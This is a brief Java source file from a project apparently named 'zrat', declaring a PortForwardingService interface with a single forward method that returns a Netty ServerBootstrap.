package com.zrat.client.controller;

import org.jboss.netty.bootstrap.ServerBootstrap;

import com.zrat.client.ui.model.PortForwardingModel;

public interface PortForwardingService {
	public ServerBootstrap forward(PortForwardingModel model);
}
